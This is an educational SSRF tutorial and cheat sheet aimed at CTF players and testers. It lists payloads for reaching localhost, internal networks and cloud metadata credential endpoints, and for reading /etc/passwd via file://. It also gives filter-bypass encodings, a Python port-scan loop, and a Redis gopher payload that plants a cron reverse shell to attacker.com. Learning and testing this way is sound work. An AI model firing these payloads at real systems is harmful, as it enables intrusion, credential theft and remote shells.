# Server-Side Request Forgery (SSRF) - Basics

## What is SSRF?

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server send HTTP requests to arbitrary destinations. The server acts as a proxy, making requests on behalf of the attacker.

**Key Impact**:
- Access internal services (databases, admin panels, cloud metadata)
- Port scanning internal network
- Bypass firewall/IP restrictions
- Read local files (in some cases)
- Execute code on internal services
- Access cloud metadata (AWS, GCP, Azure)

---

## How SSRF Works

### Normal Flow
```
User → Server → External API
User requests: https://api.example.com/data
Server fetches data and returns to user
```

### SSRF Attack Flow
```
Attacker → Server → Internal Service
Attacker provides: http://localhost:8080/admin
Server makes request to its own internal service
Attacker receives response from internal service
```

---

## Common Vulnerable Features

### 1. URL Fetchers / Web Scrapers
```
POST /fetch-url
url=http://localhost/admin

GET /screenshot?url=http://169.254.169.254/latest/meta-data/
```

### 2. Image/File Upload from URL
```
POST /upload-from-url
image_url=http://localhost:22

POST /import-avatar
avatar_url=http://169.254.169.254/
```

### 3. PDF Generators
```
POST /generate-pdf
html_content=<iframe src="http://localhost/admin"></iframe>

url=http://localhost:6379/  (Redis)
```

### 4. Webhooks
```
POST /webhooks/create
callback_url=http://localhost:9200/  (Elasticsearch)
```

### 5. Proxy Services
```
GET /proxy?url=http://localhost/

GET /fetch?target=file:///etc/passwd
```

### 6. API Integrations
```
POST /integrate
api_endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## SSRF Attack Targets

### 1. Localhost (127.0.0.1)
Access services only available locally:
```
http://localhost/admin
http://127.0.0.1:8080/
http://0.0.0.0:6379/  (Redis)
http://[::1]/  (IPv6 localhost)
```

### 2. Internal IP Ranges
Access internal network services:
```
http://192.168.0.1/
http://192.168.1.100/
http://10.0.0.1/
http://172.16.0.1/
```

### 3. Cloud Metadata Services

#### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

#### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

#### Digital Ocean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
```

### 4. Internal Services

#### Redis (Port 6379)
```
http://localhost:6379/
gopher://localhost:6379/_INFO
```

#### Memcached (Port 11211)
```
http://localhost:11211/
gopher://localhost:11211/_stats
```

#### Elasticsearch (Port 9200)
```
http://localhost:9200/
http://localhost:9200/_cluster/health
```

#### MongoDB (Port 27017)
```
http://localhost:27017/
```

#### Docker API (Port 2375/2376)
```
http://localhost:2375/containers/json
http://localhost:2375/images/json
```

---

## Basic SSRF Detection

### Step 1: Identify URL Parameters
Look for parameters that accept URLs:
```
url=
target=
redirect=
fetch=
proxy=
link=
image=
file=
src=
destination=
```

### Step 2: Test with Controlled Server
```
url=http://your-server.com/ssrf-test

# Check if your server receives a request
# Use tools like: webhook.site, burpcollaborator, requestbin
```

### Step 3: Test Localhost Access
```
url=http://localhost/
url=http://127.0.0.1/
url=http://0.0.0.0/
```

### Step 4: Test Internal IPs
```
url=http://192.168.1.1/
url=http://10.0.0.1/
url=http://172.16.0.1/
```

---

## SSRF Exploitation Techniques

### 1. Port Scanning
Scan internal network for open ports:
```python
for port in range(1, 1000):
    url = f"http://localhost:{port}/"
    response = requests.get(f"https://target.com/fetch?url={url}")
    if response.status_code != 502:  # or different error
        print(f"Port {port} is open")
```

### 2. Service Fingerprinting
Identify services by response:
```
http://localhost:3306/  → MySQL
http://localhost:5432/  → PostgreSQL
http://localhost:6379/  → Redis
http://localhost:27017/ → MongoDB
http://localhost:9200/  → Elasticsearch
```

### 3. Reading Files (if supported)
```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/www/html/config.php
file://C:/Windows/System32/drivers/etc/hosts
```

### 4. Cloud Metadata Extraction (AWS)
```
# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Get user data (often contains secrets)
http://169.254.169.254/latest/user-data/
```

### 5. Exploiting Internal Services

#### Redis Command Execution
```
gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

---

## Protocol Smuggling

### HTTP (Default)
```
http://localhost/admin
```

### File Protocol
```
file:///etc/passwd
file:///proc/self/environ
file://C:/Windows/win.ini
```

### Gopher Protocol
Useful for exploiting Redis, Memcached, SMTP:
```
gopher://localhost:6379/_INFO
gopher://localhost:25/_MAIL%20FROM:attacker@evil.com
```

### Dict Protocol
```
dict://localhost:6379/INFO
dict://localhost:11211/stats
```

### LDAP Protocol
```
ldap://localhost:389/
ldaps://localhost:636/
```

### TFTP Protocol
```
tftp://localhost:69/
```

---

## Common Filters & Bypasses

### Filter: Blocked "localhost"
**Bypasses**:
```
127.0.0.1
127.1
127.0.1
127.00.00.01
0.0.0.0
0
[::1]
localhost.localdomain
```

### Filter: Blocked "127.0.0.1"
**Bypasses**:
```
localhost
127.1
127.0.1
2130706433  (decimal IP)
0x7f000001  (hex IP)
017700000001  (octal IP)
```

### Filter: Blocked Internal IPs
**Bypasses**:
```
# Decimal notation
http://2130706433/  (127.0.0.1)
http://3232235777/  (192.168.1.1)

# Hex notation
http://0x7f000001/  (127.0.0.1)
http://0xc0a80101/  (192.168.1.1)

# Octal notation
http://0177.0000.0000.0001/  (127.0.0.1)

# Mixed notation
http://127.0.0.1
http://127.1
http://0x7f.0.0.1

# IPv6
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

### Filter: URL Validation
**Bypasses**:
```
# Using @ symbol
http://legitimate.com@localhost/
http://legitimate.com@127.0.0.1/

# Using # fragment
http://localhost#legitimate.com
http://127.0.0.1#legitimate.com

# URL shorteners
http://bit.ly/2ABC123  →  http://localhost/

# Open redirect
http://legitimate.com/redirect?url=http://localhost/

# DNS rebinding
http://your-domain.com  (resolves to 127.0.0.1)
```

### Filter: Protocol Restrictions
**Bypasses**:
```
# Case variation
hTTp://localhost/
HTtP://localhost/

# Null bytes
http://localhost%00/
http://localhost%00.example.com/

# Unicode
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/

# Enclosed alphanumerics
http://127。0。0。1/  (fullwidth periods)
```

---

## CTF-Specific Tips

### 1. Check for Flags in Metadata
```
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/
```

### 2. Access Internal Admin Panels
```
http://localhost/admin
http://localhost:8080/admin
http://127.0.0.1/flag
```

### 3. Read Configuration Files
```
file:///etc/passwd
file:///var/www/html/config.php
file:///app/flag.txt
```

### 4. Exploit Docker
```
http://localhost:2375/containers/json
http://unix:/var/run/docker.sock:/containers/json
```

### 5. Chain with Other Vulns
SSRF + Path Traversal:
```
http://localhost/../../../etc/passwd
```

---

## Testing Checklist

- [ ] Test with external callback server (webhook.site, burpcollaborator)
- [ ] Try localhost (127.0.0.1, 0.0.0.0, [::1])
- [ ] Try internal IPs (192.168.x.x, 10.x.x.x, 172.16.x.x)
- [ ] Test cloud metadata (169.254.169.254)
- [ ] Try different protocols (http, https, file, gopher, dict)
- [ ] Port scan localhost (common ports: 22, 80, 443, 3306, 5432, 6379, 8080, 9200)
- [ ] Test bypass techniques (decimal IPs, hex IPs, @ symbol, # fragment)
- [ ] Check response differences for open/closed ports
- [ ] Look for verbose error messages

---

## Quick Reference

### Basic Test
```
url=http://your-server.com/test
```

### Localhost Access
```
url=http://localhost/
url=http://127.0.0.1/
```

### Cloud Metadata (AWS)
```
url=http://169.254.169.254/latest/meta-data/
```

### Port Scan
```
url=http://localhost:22
url=http://localhost:3306
url=http://localhost:6379
```

### File Read
```
url=file:///etc/passwd
```

### Bypass localhost filter
```
url=http://127.1/
url=http://2130706433/
url=http://0x7f000001/
```

---

## Tools

- **SSRFmap**: Automated SSRF exploitation
- **Gopherus**: Generate gopher payloads
- **Burp Collaborator**: Out-of-band detection
- **webhook.site**: Test callback server
- **requestbin.com**: HTTP request inspection

Next: Deep dive into SSRF exploitation, cloud-specific attacks, and advanced bypass techniques!